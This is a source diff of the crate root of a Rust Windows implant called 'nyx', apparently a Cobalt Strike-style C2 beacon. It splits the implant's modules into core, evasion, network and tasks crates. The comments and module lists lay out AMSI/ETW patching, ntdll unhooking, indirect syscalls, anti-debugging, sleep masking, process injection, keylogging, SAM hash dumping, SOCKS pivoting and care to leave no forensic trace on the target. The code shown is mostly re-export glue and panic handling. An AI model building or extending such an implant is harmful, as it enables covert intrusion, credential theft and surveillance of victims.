@@ -15,30 +15,24 @@
 //!
 //! Full link + the sRDI PIC-extraction step happen on a Windows host.
 //!
-//! ## Modules
-//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
-//! - [`ntalloc`] — bump allocator over `NtAllocateVirtualMemory`, registered as
-//!   the `#[global_allocator]` (the `NtHeapAllocator` name is historical).
-//! - [`resolve`] — PEB walk + djb2 API resolution; `LiveNtdll` impls
-//!   `nyx_evasion::SyscallSource` so the SSN resolver runs over the *live* ntdll.
-//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll `syscall;ret`
-//!   gadget + RX trampoline); 4/6/11-arg wrappers + a process-wide global.
-//! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
-//! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
-//! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
-//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (real
-//!   P2 impls via `evasion_glue`). [`stack`]/[`sleep`]/[`mem`] are the matching
-//!   live modules (call-stack spoof / sleep mask / memory encryption).
-//! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
-//! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
-//!   wire `Command`. [`envelopes`] bakes the malleable-C2 shapes it sends.
-//! - [`transport`] — WinHTTP POST for the beacon frame (TLS via WINHTTP_FLAG_SECURE).
-//! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
-//! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
-//! - [`bof`] — W^X COFF loader + Beacon-API shims.
-//! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
-//! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
-//! - [`entry`] / [`selftests`] — PIC entry + per-module `rundll32` self-tests.
+//! ## Layout (WP-C crate split)
+//! This crate is the shell cdylib: it holds the globally-unique items
+//! (`#[global_allocator]` over [`ntalloc`], the `#[panic_handler]` and
+//! `#[alloc_error_handler]` below), the PIC [`entry`] / [`dllmain`] glue, and
+//! re-export bridges over the four extracted rlib layers so `entry.rs` keeps
+//! its original `crate::<mod>::` paths:
+//! - [`nyx_implant_core`] — heap/cell/fmt/resolve/ntalloc/unhook/stack/
+//!   version/syscalls/context/hostinfo/config/diag.
+//! - [`nyx_implant_evasion`] — antidebug/blind/blind_hwbp/cfg_user/proxy_veh/
+//!   caller_spoof/hookchain/lacuna/lacuna_stomp/sleep/fluctuation/mem/
+//!   insomniac/envprobe/evasion_glue.
+//! - [`nyx_implant_net`] — envelopes/transport/channels.
+//! - [`nyx_implant_tasks`] — beacon/bof/config_placeholder/env_keying/fs/
+//!   hashdump/inject/keylog/kits/pivot/postex/recon/screenshot/shell/
+//!   task_guard/tp/trex/selftests. The `#[no_mangle]` exports that moved with
+//!   those modules (`Beacon*` shims, `NYX_CFG_PLACEHOLDER`, the
+//!   feature-gated `nyx_selftest_*`/`nyx_linger`/`nyx_selftest_trex`) are
+//!   re-exported from this crate root below so LTO keeps them in the cdylib.
 
 #![cfg_attr(not(test), no_std)]
 #![cfg_attr(not(test), no_main)]
@@ -51,111 +45,89 @@
 
 extern crate alloc;
 
-// Team server long-term pubkey, baked at build time by build.rs (H7). A real
-// engagement sets NYX_SERVER_PUB; dev builds fall back to a marked test key.
-// Either way it is a valid (non-identity) X25519 point so the ECDH no longer
-// collapses and session keys are genuinely derived.
-mod server_pub {
-    include!(concat!(env!("OUT_DIR"), "/server_pub.rs"));
-}
+// Core layer (WP-C crate split): these 13 modules moved to the
+// `nyx-implant-core` rlib. Re-export them (with their original cfg gates:
+// heap/fmt are compiled unconditionally, the rest are Windows-only) so every
+// remaining module below keeps its `crate::heap::` / `crate::resolve::` / …
+// paths unchanged.
+#[cfg(target_os = "windows")]
+pub use nyx_implant_core::{
+    cell, config, context, diag, hostinfo, ntalloc, resolve, stack, syscalls, unhook, version,
+};
+pub use nyx_implant_core::{fmt, heap};
+// The selftest-gated #[no_mangle] export `nyx_selftest_rt_steps` lives in
+// core's syscalls module now; re-export it from the cdylib root so LTO keeps
+// the symbol and rundll32/Qiling can still call it by name.
+#[cfg(all(target_os = "windows", feature = "selftest"))]
+pub use nyx_implant_core::syscalls::nyx_selftest_rt_steps;
 
-pub mod heap;
+// Evasion layer (WP-C crate split, step 2): these 16 modules moved to the
+// `nyx-implant-evasion` rlib. Re-export them (with their original cfg gates:
+// cfg_user/fluctuation/fluctuation_thunk are compiled unconditionally, the
+// rest are Windows-only) so every remaining module below keeps its
+// `crate::<mod>::` paths unchanged.
+#[cfg(target_os = "windows")]
+pub use nyx_implant_evasion::{
+    antidebug, blind, blind_hwbp, caller_spoof, envprobe, evasion_glue, hookchain, insomniac,
+    lacuna, lacuna_stomp, mem, proxy_veh, sleep,
+};
+pub use nyx_implant_evasion::{cfg_user, fluctuation, fluctuation_thunk};
+// #[no_mangle] symbol keep-alives after the move into an rlib:
+// - `hwbp_veh_handler` is a PRODUCTION symbol: the VEH callback whose address
+//   is registered via `cfg_user::mark_addr_cfg_valid` — the symbol must
+//   survive LTO in the cdylib.
+// - the three selftest exports are called by name by rundll32/Qiling.
+// Re-export them from the cdylib root so the linker keeps them.
+#[cfg(target_os = "windows")]
+pub use nyx_implant_evasion::blind_hwbp::hwbp_veh_handler;
+#[cfg(all(target_os = "windows", feature = "selftest"))]
+pub use nyx_implant_evasion::{
+    envprobe::nyx_selftest_envprobe,
+    hookchain::{nyx_selftest_hookchain, nyx_selftest_hookchain_full},
+};
 
+// Net layer (WP-C crate split, step 3): these 3 modules moved to the
+// `nyx-implant-net` rlib. Re-export them (Windows-only, matching their
+// original declaration gates) so every remaining module below keeps its
+// `crate::channels::` / `crate::envelopes::` / `crate::transport::` paths
+// unchanged.
 #[cfg(target_os = "windows")]
-pub mod antidebug;
-#[cfg(target_os = "windows")]
-pub mod beacon;
-#[cfg(target_os = "windows")]
-pub mod cell;
+pub use nyx_implant_net::{channels, envelopes, transport};
 
-pub mod cfg_user;
-
-#[cfg(target_os = "windows")]
-pub mod blind;
-#[cfg(target_os = "windows")]
-pub mod blind_hwbp;
-#[cfg(target_os = "windows")]
-pub mod bof;
-#[cfg(target_os = "windows")]
-pub mod caller_spoof;
-#[cfg(target_os = "windows")]
-pub mod channels;
-#[cfg(target_os = "windows")]
-pub mod config;
-#[cfg(target_os = "windows")]
-pub mod config_placeholder;
-#[cfg(target_os = "windows")]
-pub mod context;
 #[cfg(target_os = "windows")]
 pub mod dllmain;
 #[cfg(target_os = "windows")]
 pub mod entry;
+
+// Tasks layer (WP-C crate split, step 4): all remaining task modules moved to
+// the `nyx-implant-tasks` rlib. Re-export them (with their original
+// declaration gates: inject is compiled unconditionally, the rest are
+// Windows-only) so entry.rs keeps its `crate::beacon::` /
+// `crate::screenshot::` / `crate::selftests::` paths unchanged.
+pub use nyx_implant_tasks::inject;
 #[cfg(target_os = "windows")]
-pub mod env_keying;
+pub use nyx_implant_tasks::{
+    beacon, bof, config_placeholder, env_keying, fs, hashdump, keylog, kits, pivot, postex, recon,
+    screenshot, selftests, shell, task_guard, tp, trex,
+};
+// #[no_mangle] symbol keep-alives after the move into an rlib:
+// - the 15 `Beacon*` shims are PRODUCTION exports: the BOF loader keys on
+//   them by name (see bof.rs "names survive to the symbol table the loader
+//   keys on"), so they must survive LTO in the cdylib.
+// - `NYX_CFG_PLACEHOLDER` is a PRODUCTION static: the server's
+//   generate_implant locates it by symbol name to compute the config patch
+//   offset — losing it silently breaks config injection.
+// - the ~53 `nyx_selftest_*` / `nyx_linger` exports and `nyx_selftest_trex`
+//   are called by name by rundll32/Qiling (selftest builds only).
+// Re-export them from the cdylib root so the linker keeps them.
 #[cfg(target_os = "windows")]
-pub mod envelopes;
+pub use nyx_implant_tasks::bof::*;
 #[cfg(target_os = "windows")]
-pub mod envprobe;
-#[cfg(target_os = "windows")]
-pub mod evasion_glue;
-pub mod fluctuation;
-pub mod fluctuation_thunk;
-pub mod fmt;
-#[cfg(target_os = "windows")]
-pub mod fs;
-#[cfg(target_os = "windows")]
-pub mod hashdump;
-#[cfg(target_os = "windows")]
-pub mod hookchain;
-#[cfg(target_os = "windows")]
-pub mod hostinfo;
-pub mod inject;
-#[cfg(target_os = "windows")]
-pub mod insomniac;
-#[cfg(target_os = "windows")]
-pub mod keylog;
-#[cfg(target_os = "windows")]
-pub mod kits;
-#[cfg(target_os = "windows")]
-pub mod lacuna;
-#[cfg(target_os = "windows")]
-pub mod lacuna_stomp;
-#[cfg(target_os = "windows")]
-pub mod mem;
-#[cfg(target_os = "windows")]
-pub mod ntalloc;
-#[cfg(target_os = "windows")]
-pub mod pivot;
-#[cfg(target_os = "windows")]
-pub mod postex;
-#[cfg(target_os = "windows")]
-pub mod proxy_veh;
-#[cfg(target_os = "windows")]
-pub mod recon;
-#[cfg(target_os = "windows")]
-pub mod resolve;
-#[cfg(target_os = "windows")]
-pub mod screenshot;
-#[cfg(target_os = "windows")]
-pub mod selftests;
-#[cfg(target_os = "windows")]
-pub mod shell;
-#[cfg(target_os = "windows")]
-pub mod sleep;
-#[cfg(target_os = "windows")]
-pub mod stack;
-#[cfg(target_os = "windows")]
-pub mod syscalls;
-#[cfg(target_os = "windows")]
-pub mod tp;
-#[cfg(target_os = "windows")]
-pub mod transport;
-#[cfg(target_os = "windows")]
-pub mod trex;
-#[cfg(target_os = "windows")]
-pub mod unhook;
-#[cfg(target_os = "windows")]
-pub mod version;
+pub use nyx_implant_tasks::config_placeholder::NYX_CFG_PLACEHOLDER;
+#[cfg(all(target_os = "windows", feature = "selftest"))]
+pub use nyx_implant_tasks::selftests::*;
+#[cfg(all(target_os = "windows", feature = "selftest"))]
+pub use nyx_implant_tasks::trex::nyx_selftest_trex;
 
 // Register the NT-Heap allocator so Vec/String work under #![no_std].
 // In test mode (std available), use the default allocator — the NT allocator
@@ -175,7 +147,7 @@ fn _panic(info: &core::panic::PanicInfo) -> ! {
         // Crash marker BEFORE ExitProcess so headless crashes are debuggable:
         // writes `%TEMP%\nyx_panic.txt` with the panic location (nyx_diag
         // builds only — production leaves no forensic file, matching
-        // `entry::diag_mark`). Best-effort; never panics itself.
+        // `diag::diag_mark`). Best-effort; never panics itself.
         write_panic_diag(info);
         // Best-effort: resolve ExitProcess and exit with a non-zero code so the
         // host/loader reaps us. If resolution fails (catastrophic — ntdll gone),
@@ -201,7 +173,7 @@ fn _panic(info: &core::panic::PanicInfo) -> ! {
 /// (no std, no allocator — the panic path must not allocate). The file exists
 /// so a headless crash leaves an identifiable artifact even when nothing else
 /// (loader log, exit code) was captured. Gated on `nyx_diag` exactly like
-/// `entry::diag_mark`; production builds compile to a no-op and leave no
+/// `diag::diag_mark`; production builds compile to a no-op and leave no
 /// forensic file on the target host.
 #[cfg(all(target_os = "windows", nyx_diag, not(test)))]
 fn write_panic_diag(info: &core::panic::PanicInfo) {
@@ -364,7 +336,7 @@ unsafe fn write_panic_diag_write_file(
     let close: CloseHandle = core::mem::transmute(ch);
 
     // GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2, CREATE_ALWAYS=2,
-    // FILE_ATTRIBUTE_NORMAL=0x80 (mirrors `entry::diag_mark`).
+    // FILE_ATTRIBUTE_NORMAL=0x80 (mirrors `diag::diag_mark`).
     let h = create(
         path16.as_ptr(),
         0x4000_0000,
@@ -436,7 +408,7 @@ fn _alloc_error(layout: core::alloc::Layout) -> ! {
     ALLOC_OOM_SIZE.store(layout.size() as u64, core::sync::atomic::Ordering::Relaxed);
     #[cfg(target_os = "windows")]
     {
-        crate::entry::diag_mark(b"ERR_ALLOC_OOM");
+        crate::diag::diag_mark(b"ERR_ALLOC_OOM");
         // Best-effort clean exit with the dedicated OOM code. If ExitProcess
         // can't be resolved (catastrophic — ntdll/kernel32 gone), fall through
         // to the defensive trap, mirroring the panic handler.
